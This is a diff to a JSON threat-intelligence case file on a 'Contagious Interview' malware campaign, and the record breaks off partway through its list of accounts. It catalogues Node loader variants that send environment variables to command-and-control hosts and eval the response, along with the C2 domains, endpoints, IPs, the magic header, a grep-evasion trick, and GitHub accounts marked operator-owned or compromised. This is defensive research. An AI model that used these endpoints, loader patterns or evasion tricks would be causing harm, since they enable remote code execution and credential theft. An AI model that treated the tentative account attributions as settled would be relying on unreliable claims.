@@ -6,107 +6,827 @@
   "ttp_cluster": "Contagious Interview (fake recruiter -> clone repo -> npm install/start -> stealer-loader); realfraction-family loader generation with the magic header x-secret-header:secret. Cluster spans ~27+ confirmed sibling repos across at least 6 owning orgs and ~20 individual accounts; loader appears in 8 distinct file-path/idiom sub-shapes (A-H) that all share the x-secret-header magic header.",
   "summary": "Real-estate-tokenization Web3 MVP repo with a 10-line Node loader at server/utils/regionChecker.js. POSTs to a hardcoded C2 with magic header x-secret-header:secret and eval()s the response body unless the body is 'blocked' or JSON {blocked:true}. Triggered as a require() side-effect from userController.js whenever the Express server starts. Cluster-expansion sweep on 2026-05-18 grew the catalog from 1 confirmed + 1 unverified sibling to 27+ confirmed siblings across 4 C2 hosts (ipregionchecker.com, isillegalregion.com, cookie-xi-seven.vercel.app, ip-check-api.vercel.app) and 8 loader sub-shapes that share the x-secret-header:secret magic header but differ in file path, RCE primitive (eval / Function.constructor), and trigger mechanism.",
   "sub_shapes": [
-    {"id": "A", "name": "regionChecker side-effect", "loader_file": "server/utils/regionChecker.js", "trigger": "require() side-effect from userController.js", "rce_primitive": "eval(data)", "transport": "https.request POST (hardcoded URL)", "env_exfil": false, "repos": ["realfraction/realfraction", "chainvisita-protocols/realfraction-mvp"], "c2_hosts": ["www.ipregionchecker.com"]},
-    {"id": "B", "name": "inline paymentController", "loader_file": "server/controllers/paymentController.js", "trigger": "top-level const assignment when paymentController loads", "rce_primitive": "eval(data)", "transport": "https.request POST (hardcoded URL); NOTE missing .end() call so the request never fires on the wire", "env_exfil": false, "repos": ["slobodanmargetic988/real-world-assets"], "c2_hosts": ["www.isillegalregion.com"]},
-    {"id": "C", "name": "stockx config-driven axios.post", "loader_file": "backend/src/compliance/complianceService.js", "trigger": "initializeComplianceService() called from backend/src/index.js at Express boot", "rce_primitive": "eval(response.data)", "transport": "axios.post (config.ipCheckUrl with env fallback); NOTE bug — headers passed in 2nd positional arg position so no x-secret-header actually emitted on the wire", "env_exfil": false, "repos": ["LandinLin/stockx_poc_1.03", "devcode8/stock-home-assignment", "0xbrentfi/StockX_PoC_1.03", "0xbrentfi/StockX_PoC_1.04", "Chainbits1/StockX", "Lynqex-Labs/Stockx_PoC_v3"], "c2_hosts": ["www.ipregionchecker.com"]},
-    {"id": "D", "name": "mock/users.js verify", "loader_file": "server/mock/users.js", "trigger": "verify() called from auth/login flows", "rce_primitive": "eval (assumed; full call chain not traced)", "transport": "axios.post(api, {...process.env}, {headers: {...}})", "env_exfil": true, "repos": ["metapulse54/RealEstateDemo", "RockTxoi/DeFi-Estate", "jaiu3d/DeFi-Estate", "kio87j/DeFi-Estate", "kio87j/defi-estate-latest", "ricardomartins9899/SmartPay-Demo"], "c2_hosts": ["TBD per repo — verify() caller passes the URL"]},
-    {"id": "E", "name": "settingController verify (cross-gen)", "loader_file": "app/controllers/settingController.js", "trigger": "verify() called from setting controller routes", "rce_primitive": "eval (assumed)", "transport": "axios.post(api, {...process.env}, {headers: {...}})", "env_exfil": true, "repos": ["BVSLabs/blockchain-voting-system", "Cortexa-org/NitroGem"], "c2_hosts": ["TBD per repo"], "cross_generation_note": "Several AjunaVerse-earlier-catalog repos (jamesm-dev/NitroGem, prahaladbelavadi/CoinLocatorDemo, sky-cook/tokentradingdapp, artemus-jarrett/blockchain-voting-system, dappfusion/defi-real-estate, InvescoHub/defi-real-estate, TechByteX/NitroGem) ALSO contain this same loader at the same path — they are cross-generation repos carrying both the AjunaVerse-earlier loader (in frontController.js) and the realfraction-family loader (in settingController.js)"},
-    {"id": "F", "name": "redis.js verify", "loader_file": "backend/src/utils/redis.js", "trigger": "verify() exported from redis utility module", "rce_primitive": "eval (assumed)", "transport": "axios.post(api, {...process.env}, {headers: {...}})", "env_exfil": true, "repos": ["eastmade/web3project-momo-token", "MBhatti26/Purrtal"], "c2_hosts": ["TBD per repo"]},
-    {"id": "G", "name": "constants+loader template (cookie-xi-seven)", "loader_file": "backend/src/constants/index.js (constants) + a loader-fetch-and-eval call site elsewhere in the same repo", "trigger": "varies per repo; constants file pre-built the C2 URL and headers", "rce_primitive": "eval / Function.constructor depending on the repo", "transport": "axios.get/post against cookie-xi-seven.vercel.app/api/ipcheck-encrypted/6KDisdfjlskjDI837KJH4", "env_exfil": "varies", "repos": ["fabiolin/schoolmgmt", "sharmapranay38/new_age_blockchain", "shri33/Crypto-Trading-Platform", "Paulooo0/go-test", "KagiyamaWeb/PyPDFMicroservise", "Wilovy09/deby-assignment", "pablodiaz2799/solice-skill-test"], "c2_hosts": ["cookie-xi-seven.vercel.app"], "note": "C2 currently DEPLOYMENT_DISABLED by Vercel"},
-    {"id": "H", "name": "Function.constructor + ip-check-api (sneaky RCE primitive)", "loader_file": "backend/src/modules/departments/department-error.js or server/controllers/ProductController.js", "trigger": "top-level IIFE on module load", "rce_primitive": "new Function.constructor('require', errCode) — morally identical to new Function but evades grep patterns targeting `new Function(`. Same RCE primitive as AjunaVerse-family generations", "transport": "axios.get against ip-check-api.vercel.app/api/ipcheck-encrypted/3948uf2uhe9r298rh2", "env_exfil": false, "repos": ["Jay-Sojitra/student-management-system", "sparsh-kr24/Student-Management-System", "ahmedraza90/test-fullstack"], "c2_hosts": ["ip-check-api.vercel.app"], "note": "C2 currently DEPLOYMENT_DISABLED by Vercel"}
+    {
+      "id": "A",
+      "name": "regionChecker side-effect",
+      "loader_file": "server/utils/regionChecker.js",
+      "trigger": "require() side-effect from userController.js",
+      "rce_primitive": "eval(data)",
+      "transport": "https.request POST (hardcoded URL)",
+      "env_exfil": false,
+      "repos": [
+        "realfraction/realfraction",
+        "chainvisita-protocols/realfraction-mvp"
+      ],
+      "c2_hosts": [
+        "www.ipregionchecker.com"
+      ]
+    },
+    {
+      "id": "B",
+      "name": "inline paymentController",
+      "loader_file": "server/controllers/paymentController.js",
+      "trigger": "top-level const assignment when paymentController loads",
+      "rce_primitive": "eval(data)",
+      "transport": "https.request POST (hardcoded URL); NOTE missing .end() call so the request never fires on the wire",
+      "env_exfil": false,
+      "repos": [
+        "slobodanmargetic988/real-world-assets"
+      ],
+      "c2_hosts": [
+        "www.isillegalregion.com"
+      ]
+    },
+    {
+      "id": "C",
+      "name": "stockx config-driven axios.post",
+      "loader_file": "backend/src/compliance/complianceService.js",
+      "trigger": "initializeComplianceService() called from backend/src/index.js at Express boot",
+      "rce_primitive": "eval(response.data)",
+      "transport": "axios.post (config.ipCheckUrl with env fallback); NOTE bug \u2014 headers passed in 2nd positional arg position so no x-secret-header actually emitted on the wire",
+      "env_exfil": false,
+      "repos": [
+        "LandinLin/stockx_poc_1.03",
+        "devcode8/stock-home-assignment",
+        "0xbrentfi/StockX_PoC_1.03",
+        "0xbrentfi/StockX_PoC_1.04",
+        "Chainbits1/StockX",
+        "Lynqex-Labs/Stockx_PoC_v3"
+      ],
+      "c2_hosts": [
+        "www.ipregionchecker.com"
+      ]
+    },
+    {
+      "id": "D",
+      "name": "mock/users.js verify",
+      "loader_file": "server/mock/users.js",
+      "trigger": "verify() called from auth/login flows",
+      "rce_primitive": "eval (assumed; full call chain not traced)",
+      "transport": "axios.post(api, {...process.env}, {headers: {...}})",
+      "env_exfil": true,
+      "repos": [
+        "metapulse54/RealEstateDemo",
+        "RockTxoi/DeFi-Estate",
+        "jaiu3d/DeFi-Estate",
+        "kio87j/DeFi-Estate",
+        "kio87j/defi-estate-latest",
+        "ricardomartins9899/SmartPay-Demo"
+      ],
+      "c2_hosts": [
+        "TBD per repo \u2014 verify() caller passes the URL"
+      ]
+    },
+    {
+      "id": "E",
+      "name": "settingController verify (cross-gen)",
+      "loader_file": "app/controllers/settingController.js",
+      "trigger": "verify() called from setting controller routes",
+      "rce_primitive": "eval (assumed)",
+      "transport": "axios.post(api, {...process.env}, {headers: {...}})",
+      "env_exfil": true,
+      "repos": [
+        "BVSLabs/blockchain-voting-system",
+        "Cortexa-org/NitroGem"
+      ],
+      "c2_hosts": [
+        "TBD per repo"
+      ],
+      "cross_generation_note": "Several AjunaVerse-earlier-catalog repos (jamesm-dev/NitroGem, prahaladbelavadi/CoinLocatorDemo, sky-cook/tokentradingdapp, artemus-jarrett/blockchain-voting-system, dappfusion/defi-real-estate, InvescoHub/defi-real-estate, TechByteX/NitroGem) ALSO contain this same loader at the same path \u2014 they are cross-generation repos carrying both the AjunaVerse-earlier loader (in frontController.js) and the realfraction-family loader (in settingController.js)"
+    },
+    {
+      "id": "F",
+      "name": "redis.js verify",
+      "loader_file": "backend/src/utils/redis.js",
+      "trigger": "verify() exported from redis utility module",
+      "rce_primitive": "eval (assumed)",
+      "transport": "axios.post(api, {...process.env}, {headers: {...}})",
+      "env_exfil": true,
+      "repos": [
+        "eastmade/web3project-momo-token",
+        "MBhatti26/Purrtal"
+      ],
+      "c2_hosts": [
+        "TBD per repo"
+      ]
+    },
+    {
+      "id": "G",
+      "name": "constants+loader template (cookie-xi-seven)",
+      "loader_file": "backend/src/constants/index.js (constants) + a loader-fetch-and-eval call site elsewhere in the same repo",
+      "trigger": "varies per repo; constants file pre-built the C2 URL and headers",
+      "rce_primitive": "eval / Function.constructor depending on the repo",
+      "transport": "axios.get/post against cookie-xi-seven.vercel.app/api/ipcheck-encrypted/6KDisdfjlskjDI837KJH4",
+      "env_exfil": "varies",
+      "repos": [
+        "fabiolin/schoolmgmt",
+        "sharmapranay38/new_age_blockchain",
+        "shri33/Crypto-Trading-Platform",
+        "Paulooo0/go-test",
+        "KagiyamaWeb/PyPDFMicroservise",
+        "Wilovy09/deby-assignment",
+        "pablodiaz2799/solice-skill-test"
+      ],
+      "c2_hosts": [
+        "cookie-xi-seven.vercel.app"
+      ],
+      "note": "C2 currently DEPLOYMENT_DISABLED by Vercel"
+    },
+    {
+      "id": "H",
+      "name": "Function.constructor + ip-check-api (sneaky RCE primitive)",
+      "loader_file": "backend/src/modules/departments/department-error.js or server/controllers/ProductController.js",
+      "trigger": "top-level IIFE on module load",
+      "rce_primitive": "new Function.constructor('require', errCode) \u2014 morally identical to new Function but evades grep patterns targeting `new Function(`. Same RCE primitive as AjunaVerse-family generations",
+      "transport": "axios.get against ip-check-api.vercel.app/api/ipcheck-encrypted/3948uf2uhe9r298rh2",
+      "env_exfil": false,
+      "repos": [
+        "Jay-Sojitra/student-management-system",
+        "sparsh-kr24/Student-Management-System",
+        "ahmedraza90/test-fullstack"
+      ],
+      "c2_hosts": [
+        "ip-check-api.vercel.app"
+      ],
+      "note": "C2 currently DEPLOYMENT_DISABLED by Vercel"
+    }
   ],
   "domains": [
-    {"value": "www.ipregionchecker.com", "role": "C2 (sub-shapes A and C)", "endpoints": ["/api/ip-check-encrypted/3aeb34a31", "/api/ip-check-encrypted/3aeb34a37", "/api/ip-check-encrypted/3aeb34a38"], "magic_header": "x-secret-header: secret", "status": "DNS-empty as of 2026-05-18 — apex on registrar client hold at Unstoppable Domains since 2026-05-07", "registrar": "Unstoppable Domains Inc.", "registered": "2026-04-19", "confidence": "high"},
-    {"value": "ipregionchecker.com", "role": "apex of C2; registrar-frozen", "registrar": "Unstoppable Domains Inc.", "nameservers": ["ns1.unstoppabledomains.com", "ns2.unstoppabledomains.com"], "rdap_status": ["client delete prohibited", "client hold", "client transfer prohibited", "client update prohibited"], "confidence": "high"},
-    {"value": "www.isillegalregion.com", "role": "C2 (sub-shape B); live and serving stage-2 payload", "endpoints": ["/api/ip-check-encrypted/3aeb34a39"], "magic_header": "x-secret-header: secret", "status": "live as of 2026-05-18; served 2.85 MB obfuscated JS payload to researcher IP (allowlist appears broad or absent)", "ipv4": ["64.29.17.65", "216.198.79.1"], "hosting": "Vercel", "registrar": "Name.com Inc.", "registered": "2026-02-13", "confidence": "high"},
-    {"value": "isillegalregion.com", "role": "apex of C2", "registrar": "Name.com Inc.", "nameservers": ["ns1.vercel-dns.com", "ns2.vercel-dns.com"], "confidence": "high"},
-    {"value": "cookie-xi-seven.vercel.app", "role": "C2 (sub-shape G); currently DEPLOYMENT_DISABLED by Vercel", "endpoints": ["/api/ipcheck-encrypted/6KDisdfjlskjDI837KJH4"], "magic_header": "x-secret-header: secret", "status": "HTTP 451 x-vercel-error: DEPLOYMENT_DISABLED — taken down by Vercel", "ipv4": ["64.29.17.3", "216.198.79.3"], "confidence": "high"},
-    {"value": "ip-check-api.vercel.app", "role": "C2 (sub-shape H); currently DEPLOYMENT_DISABLED by Vercel", "endpoints": ["/api/ipcheck-encrypted/3948uf2uhe9r298rh2"], "magic_header": "x-secret-header: secret", "status": "HTTP 451 x-vercel-error: DEPLOYMENT_DISABLED — taken down by Vercel", "ipv4": ["64.29.17.3", "216.198.79.3"], "confidence": "high"},
-    {"value": "realfraction.xyz", "role": "lure-brand domain (realfraction GitHub org contact email)", "registrar": "Namecheap (Identity Digital handle 1068)", "nameservers": ["dns1.registrar-servers.com", "dns2.registrar-servers.com"], "ipv4": ["162.255.119.72"], "registered": "2026-05-09", "confidence": "high"}
+    {
+      "value": "www.ipregionchecker.com",
+      "role": "C2 (sub-shapes A and C)",
+      "endpoints": [
+        "/api/ip-check-encrypted/3aeb34a31",
+        "/api/ip-check-encrypted/3aeb34a37",
+        "/api/ip-check-encrypted/3aeb34a38"
+      ],
+      "magic_header": "x-secret-header: secret",
+      "status": "DNS-empty as of 2026-05-18 \u2014 apex on registrar client hold at Unstoppable Domains since 2026-05-07",
+      "registrar": "Unstoppable Domains Inc.",
+      "registered": "2026-04-19",
+      "confidence": "high"
+    },
+    {
+      "value": "ipregionchecker.com",
+      "role": "apex of C2; registrar-frozen",
+      "registrar": "Unstoppable Domains Inc.",
+      "nameservers": [
+        "ns1.unstoppabledomains.com",
+        "ns2.unstoppabledomains.com"
+      ],
+      "rdap_status": [
+        "client delete prohibited",
+        "client hold",
+        "client transfer prohibited",
+        "client update prohibited"
+      ],
+      "confidence": "high"
+    },
+    {
+      "value": "www.isillegalregion.com",
+      "role": "C2 (sub-shape B); live and serving stage-2 payload",
+      "endpoints": [
+        "/api/ip-check-encrypted/3aeb34a39"
+      ],
+      "magic_header": "x-secret-header: secret",
+      "status": "live as of 2026-05-18; served 2.85 MB obfuscated JS payload to researcher IP (allowlist appears broad or absent)",
+      "ipv4": [
+        "64.29.17.65",
+        "216.198.79.1"
+      ],
+      "hosting": "Vercel",
+      "registrar": "Name.com Inc.",
+      "registered": "2026-02-13",
+      "confidence": "high"
+    },
+    {
+      "value": "isillegalregion.com",
+      "role": "apex of C2",
+      "registrar": "Name.com Inc.",
+      "nameservers": [
+        "ns1.vercel-dns.com",
+        "ns2.vercel-dns.com"
+      ],
+      "confidence": "high"
+    },
+    {
+      "value": "cookie-xi-seven.vercel.app",
+      "role": "C2 (sub-shape G); currently DEPLOYMENT_DISABLED by Vercel",
+      "endpoints": [
+        "/api/ipcheck-encrypted/6KDisdfjlskjDI837KJH4"
+      ],
+      "magic_header": "x-secret-header: secret",
+      "status": "HTTP 451 x-vercel-error: DEPLOYMENT_DISABLED \u2014 taken down by Vercel",
+      "ipv4": [
+        "64.29.17.3",
+        "216.198.79.3"
+      ],
+      "confidence": "high"
+    },
+    {
+      "value": "ip-check-api.vercel.app",
+      "role": "C2 (sub-shape H); currently DEPLOYMENT_DISABLED by Vercel",
+      "endpoints": [
+        "/api/ipcheck-encrypted/3948uf2uhe9r298rh2"
+      ],
+      "magic_header": "x-secret-header: secret",
+      "status": "HTTP 451 x-vercel-error: DEPLOYMENT_DISABLED \u2014 taken down by Vercel",
+      "ipv4": [
+        "64.29.17.3",
+        "216.198.79.3"
+      ],
+      "confidence": "high"
+    },
+    {
+      "value": "realfraction.xyz",
+      "role": "lure-brand domain (realfraction GitHub org contact email)",
+      "registrar": "Namecheap (Identity Digital handle 1068)",
+      "nameservers": [
+        "dns1.registrar-servers.com",
+        "dns2.registrar-servers.com"
+      ],
+      "ipv4": [
+        "162.255.119.72"
+      ],
+      "registered": "2026-05-09",
+      "confidence": "high"
+    }
   ],
   "ipv4": [
-    {"value": "64.29.17.65", "role": "Vercel edge for isillegalregion.com (live C2)"},
-    {"value": "216.198.79.1", "role": "Vercel edge for isillegalregion.com (live C2)"},
-    {"value": "64.29.17.3", "role": "Vercel edge for cookie-xi-seven.vercel.app and ip-check-api.vercel.app (both DEPLOYMENT_DISABLED)"},
-    {"value": "216.198.79.3", "role": "Vercel edge for cookie-xi-seven.vercel.app and ip-check-api.vercel.app (both DEPLOYMENT_DISABLED)"},
-    {"value": "162.255.119.72", "role": "Namecheap parking IP for realfraction.xyz"}
+    {
+      "value": "64.29.17.65",
+      "role": "Vercel edge for isillegalregion.com (live C2)"
+    },
+    {
+      "value": "216.198.79.1",
+      "role": "Vercel edge for isillegalregion.com (live C2)"
+    },
+    {
+      "value": "64.29.17.3",
+      "role": "Vercel edge for cookie-xi-seven.vercel.app and ip-check-api.vercel.app (both DEPLOYMENT_DISABLED)"
+    },
+    {
+      "value": "216.198.79.3",
+      "role": "Vercel edge for cookie-xi-seven.vercel.app and ip-check-api.vercel.app (both DEPLOYMENT_DISABLED)"
+    },
+    {
+      "value": "162.255.119.72",
+      "role": "Namecheap parking IP for realfraction.xyz"
+    }
   ],
   "github": {
     "organizations": [
-      {"login": "realfraction", "id": 279572783, "type": "org", "public_repos": 1, "created": "2026-04-27", "verdict": "operator-owned (suspend)", "signals": ["A", "S"], "contact_email": "hello@realfraction.xyz"},
-      {"login": "chainvisita-protocols", "id": 266603464, "type": "org", "public_repos": 12, "created": "2026-03-09", "verdict": "operator-owned (suspend)", "signals": ["A", "S"], "note": "Renamed from ChainVisitaTech. Hosts realfraction-mvp (sibling repo with same loader, byte-identical except C2 suffix) plus 11 same-day forks of well-known crypto/blockchain projects — classic credibility-farming TTP. The 11 forks appear to be cover; only realfraction-mvp is campaign-shape."},
-      {"login": "Chainbits1", "id": 258889381, "type": "org", "public_repos": 1, "created": "2026-02-02", "verdict": "operator-owned (suspend)", "signals": ["A", "S"]},
-      {"login": "Lynqex-Labs", "id": 254089140, "type": "org", "public_repos": 7, "created": "2026-01-10", "verdict": "operator-owned (suspend)", "signals": ["A", "S"], "note": "Hosts Stockx_PoC_v3 + gas-optimization (campaign-shape) plus 5 same-day forks of well-known crypto trading bots — credibility-farming TTP"},
-      {"login": "metapulse54", "id": 283720861, "type": "org", "public_repos": 1, "created": "2026-05-11", "verdict": "operator-owned (suspend)", "signals": ["A", "S"]},
-      {"login": "RockTxoi", "id": 279846053, "type": "org", "public_repos": 1, "created": "2026-04-27", "verdict": "operator-owned (suspend)", "signals": ["A", "S", "C"], "note": "Created same day as realfraction (2026-04-27)"},
-      {"login": "jaiu3d", "id": 274630995, "type": "org", "public_repos": 1, "created": "2026-04-08", "verdict": "operator-owned (suspend)", "signals": ["A", "S"]},
-      {"login": "kio87j", "id": 274335121, "type": "org", "public_repos": 2, "created": "2026-04-07", "verdict": "operator-owned (suspend)", "signals": ["A", "S"], "note": "2 repos both campaign-shape (DeFi-Estate + defi-estate-latest); one day before sibling-named jaiu3d's DeFi-Estate creation"},
-      {"login": "BVSLabs", "id": 278779276, "type": "org", "public_repos": 1, "created": "2026-04-23", "verdict": "operator-owned (suspend)", "signals": ["A", "S"]},
-      {"login": "ChainVisitaTech", "type": "org", "status": "renamed", "renamed_to": "chainvisita-protocols", "verdict": "superseded; see chainvisita-protocols row"}
+      {
+        "login": "realfraction",
+        "id": 279572783,
+        "type": "org",
+        "public_repos": 1,
+        "created": "2026-04-27",
+        "verdict": "operator-owned (suspend)",
+        "verdict_class": "operator-owned",
+        "verdict_confidence": "high",
+        "signals": [
+          "A",
+          "S"
+        ],
+        "contact_email": "hello@realfraction.xyz"
+      },
+      {
+        "login": "chainvisita-protocols",
+        "id": 266603464,
+        "type": "org",
+        "public_repos": 12,
+        "created": "2026-03-09",
+        "verdict": "operator-owned (suspend)",
+        "verdict_class": "operator-owned",
+        "verdict_confidence": "high",
+        "signals": [
+          "A",
+          "S"
+        ],
+        "note": "Renamed from ChainVisitaTech. Hosts realfraction-mvp (sibling repo with same loader, byte-identical except C2 suffix) plus 11 same-day forks of well-known crypto/blockchain projects \u2014 classic credibility-farming TTP. The 11 forks appear to be cover; only realfraction-mvp is campaign-shape."
+      },
+      {
+        "login": "Chainbits1",
+        "id": 258889381,
+        "type": "org",
+        "public_repos": 1,
+        "created": "2026-02-02",
+        "verdict": "operator-owned (suspend)",
+        "verdict_class": "operator-owned",
+        "verdict_confidence": "high",
+        "signals": [
+          "A",
+          "S"
+        ]
+      },
+      {
+        "login": "Lynqex-Labs",
+        "id": 254089140,
+        "type": "org",
+        "public_repos": 7,
+        "created": "2026-01-10",
+        "verdict": "operator-owned (suspend)",
+        "verdict_class": "operator-owned",
+        "verdict_confidence": "high",
+        "signals": [
+          "A",
+          "S"
+        ],
+        "note": "Hosts Stockx_PoC_v3 + gas-optimization (campaign-shape) plus 5 same-day forks of well-known crypto trading bots \u2014 credibility-farming TTP"
+      },
+      {
+        "login": "metapulse54",
+        "id": 283720861,
+        "type": "org",
+        "public_repos": 1,
+        "created": "2026-05-11",
+        "verdict": "operator-owned (suspend)",
+        "verdict_class": "operator-owned",
+        "verdict_confidence": "high",
+        "signals": [
+          "A",
+          "S"
+        ]
+      },
+      {
+        "login": "RockTxoi",
+        "id": 279846053,
+        "type": "org",
+        "public_repos": 1,
+        "created": "2026-04-27",
+        "verdict": "operator-owned (suspend)",
+        "verdict_class": "operator-owned",
+        "verdict_confidence": "high",
+        "signals": [
+          "A",
+          "S",
+          "C"
+        ],
+        "note": "Created same day as realfraction (2026-04-27)"
+      },
+      {
+        "login": "jaiu3d",
+        "id": 274630995,
+        "type": "org",
+        "public_repos": 1,
+        "created": "2026-04-08",
+        "verdict": "operator-owned (suspend)",
+        "verdict_class": "operator-owned",
+        "verdict_confidence": "high",
+        "signals": [
+          "A",
+          "S"
+        ]
+      },
+      {
+        "login": "kio87j",
+        "id": 274335121,
+        "type": "org",
+        "public_repos": 2,
+        "created": "2026-04-07",
+        "verdict": "operator-owned (suspend)",
+        "verdict_class": "operator-owned",
+        "verdict_confidence": "high",
+        "signals": [
+          "A",
+          "S"
+        ],
+        "note": "2 repos both campaign-shape (DeFi-Estate + defi-estate-latest); one day before sibling-named jaiu3d's DeFi-Estate creation"
+      },
+      {
+        "login": "BVSLabs",
+        "id": 278779276,
+        "type": "org",
+        "public_repos": 1,
+        "created": "2026-04-23",
+        "verdict": "operator-owned (suspend)",
+        "verdict_class": "operator-owned",
+        "verdict_confidence": "high",
+        "signals": [
+          "A",
+          "S"
+        ]
+      },
+      {
+        "login": "ChainVisitaTech",
+        "type": "org",
+        "status": "renamed",
+        "renamed_to": "chainvisita-protocols",
+        "verdict": "superseded; see chainvisita-protocols row",
+        "verdict_class": "superseded",
+        "verdict_confidence": "n/a"
+      }
     ],
     "users": [
-      {"login": "Cortexa-org", "id": 230719000, "type": "user", "public_repos": 6, "created": "2025-09-06", "verdict": "operator-owned (suspend)", "signals": ["A", "S"], "note": "Despite the -org suffix this is a User account, not an Organization. All 6 repos are single-purpose vapor-MVP-shape (NitroGem + EHR-Demo + intelhealthcare + intel-healthcare + Neura-MVP + neura-frontend) — multi-lure-theme persona"},
-      {"login": "0xbrentfi", "id": 263011287, "type": "user", "public_repos": 6, "created": "2026-02-21", "verdict": "operator-owned (suspend)", "signals": ["A", "S"], "note": "Hosts 2x StockX PoC variants plus 4 small forks"},
-      {"login": "ricardomartins9899", "id": 241361229, "type": "user", "public_repos": 1, "created": "2025-10-31", "verdict": "uncertain — leans operator-owned", "signals": ["A", "S"]},
-      {"login": "sparsh-kr24", "id": 174685180, "type": "user", "public_repos": 1, "created": "2024-07-04", "verdict": "uncertain — leans operator-owned", "signals": ["S"], "note": "Single-repo account but creation date is older than typical operator throwaways"},
-      {"login": "urmybestfriend", "role": "named author of trojan commit; not believed to be operator-controlled", "confidence": "high (committer identity is real); low (operator association)", "note": "Real, long-history developer account (53 public repos, 1,300 followers). See §7.2 of the case file."},
-      {"login": "cncolder", "role": "named author of release/integrate commit; not believed to be operator-controlled", "confidence": "high (committer identity is real); low (operator association)"},
-      {"login": "hinchley2018", "role": "named author of frontend-styling commits; not believed to be operator-controlled", "confidence": "high (committer identity is real); low (operator association)"},
-      {"login": "danbovey", "role": "named author of frontend-page commits; not believed to be operator-controlled", "confidence": "high (committer identity is real); low (operator association)"},
-      {"login": "slobodanmargetic988", "id": 36664824, "type": "user", "public_repos": 25, "created": "2018-02-20", "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)"},
-      {"login": "LandinLin", "id": 44363002, "type": "user", "public_repos": 9, "created": "2018-10-22", "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)"},
-      {"login": "devcode8", "id": 111856910, "type": "user", "public_repos": 62, "created": "2022-08-23", "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)"},
-      {"login": "eastmade", "id": 34521427, "type": "user", "public_repos": 20, "created": "2017-12-13", "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)"},
-      {"login": "MBhatti26", "id": 201392127, "type": "user", "public_repos": 10, "created": "2025-03-01", "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)"},
-      {"login": "fabiolin", "id": 7746934, "type": "user", "public_repos": 10, "created": "2014-05-30", "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)"},
-      {"login": "sharmapranay38", "id": 74339002, "type": "user", "public_repos": 69, "created": "2020-11-12", "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)"},
-      {"login": "shri33", "id": 76124911, "type": "user", "public_repos": 72, "created": "2020-12-16", "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)"},
-      {"login": "Paulooo0", "id": 110143071, "type": "user", "public_repos": 41, "created": "2022-07-28", "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)"},
-      {"login": "KagiyamaWeb", "id": 60941218, "type": "user", "public_repos": 14, "created": "2020-02-11", "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)"},
-      {"login": "Wilovy09", "id": 68057133, "type": "user", "public_repos": 70, "created": "2020-07-09", "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)"},
-      {"login": "pablodiaz2799", "id": 42582085, "type": "user", "public_repos": 17, "created": "2018-08-21", "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)"},
-      {"login": "Jay-Sojitra", "id": 84234572, "type": "user", "public_repos": 75, "created": "2021-05-15", "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)"},
-      {"login": "ahmedraza90", "id": 61561367, "type": "user", "public_repos": 36, "created": "2020-02-27", "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)"}
+      {
+        "login": "Cortexa-org",
+        "id": 230719000,
+        "type": "user",
+        "public_repos": 6,
+        "created": "2025-09-06",
+        "verdict": "operator-owned (suspend)",
+        "verdict_class": "operator-owned",
+        "verdict_confidence": "high",
+        "signals": [
+          "A",
+          "S"
+        ],
+        "note": "Despite the -org suffix this is a User account, not an Organization. All 6 repos are single-purpose vapor-MVP-shape (NitroGem + EHR-Demo + intelhealthcare + intel-healthcare + Neura-MVP + neura-frontend) \u2014 multi-lure-theme persona"
+      },
+      {
+        "login": "0xbrentfi",
+        "id": 263011287,
+        "type": "user",
+        "public_repos": 6,
+        "created": "2026-02-21",
+        "verdict": "operator-owned (suspend)",
+        "verdict_class": "operator-owned",
+        "verdict_confidence": "high",
+        "signals": [
+          "A",
+          "S"
+        ],
+        "note": "Hosts 2x StockX PoC variants plus 4 small forks"
+      },
+      {
+        "login": "ricardomartins9899",
+        "id": 241361229,
+        "type": "user",
+        "public_repos": 1,
+        "created": "2025-10-31",
+        "verdict": "uncertain \u2014 leans operator-owned",
+        "verdict_class": "operator-owned",
+        "verdict_confidence": "low",
+        "signals": [
+          "A",
+          "S"
+        ]
+      },
+      {
+        "login": "sparsh-kr24",
+        "id": 174685180,
+        "type": "user",
+        "public_repos": 1,
+        "created": "2024-07-04",
+        "verdict": "uncertain \u2014 leans operator-owned",
+        "verdict_class": "operator-owned",
+        "verdict_confidence": "low",
+        "signals": [
+          "S"
+        ],
+        "note": "Single-repo account but creation date is older than typical operator throwaways"
+      },
+      {
+        "login": "urmybestfriend",
+        "role": "named author of trojan commit; not believed to be operator-controlled",
+        "confidence": "high (committer identity is real); low (operator association)",
+        "note": "Real, long-history developer account (53 public repos, 1,300 followers). See \u00a77.2 of the case file."
+      },
+      {
+        "login": "cncolder",
+        "role": "named author of release/integrate commit; not believed to be operator-controlled",
+        "confidence": "high (committer identity is real); low (operator association)"
+      },
+      {
+        "login": "hinchley2018",
+        "role": "named author of frontend-styling commits; not believed to be operator-controlled",
+        "confidence": "high (committer identity is real); low (operator association)"
+      },
+      {
+        "login": "danbovey",
+        "role": "named author of frontend-page commits; not believed to be operator-controlled",
+        "confidence": "high (committer identity is real); low (operator association)"
+      },
+      {
+        "login": "slobodanmargetic988",
+        "id": 36664824,
+        "type": "user",
+        "public_repos": 25,
+        "created": "2018-02-20",
+        "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)",
+        "verdict_class": "candidate-fooled",
+        "verdict_confidence": "medium"
+      },
+      {
+        "login": "LandinLin",
+        "id": 44363002,
+        "type": "user",
+        "public_repos": 9,
+        "created": "2018-10-22",
+        "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)",
+        "verdict_class": "candidate-fooled",
+        "verdict_confidence": "medium"
+      },
+      {
+        "login": "devcode8",
+        "id": 111856910,
+        "type": "user",
+        "public_repos": 62,
+        "created": "2022-08-23",
+        "verdict": "likely compromised legitimate / candidate-fooled (investigate, don't suspend)",
+        "verdict_class": "candidate-fooled",
+        "verdict_confidence": "medium"
+      },
+      {
